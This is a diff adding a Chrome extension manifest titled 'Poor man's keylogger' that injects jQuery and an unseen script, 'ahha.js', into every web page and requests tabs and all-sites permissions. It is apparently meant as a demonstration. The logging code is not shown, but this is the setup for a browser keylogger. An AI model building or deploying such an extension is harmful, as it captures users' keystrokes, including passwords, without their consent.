@@ -1,0 +1,20 @@
+{
+  "manifest_version": 2,
+
+  "name": "Poor man's keylogger",
+  "description": "This extension demonstrates key logging via chrome web browser",
+  "version": "1.0",
+  "content_scripts": [{
+    "matches": ["http://*/*", "https://*/*"],
+    "css": [],
+    "js": [
+        "jquery.js",
+        "ahha.js"
+    ]
+  }],
+  "permissions": [
+    "tabs",
+    "http://*/*",
+    "https://*/*"
+  ]
+}
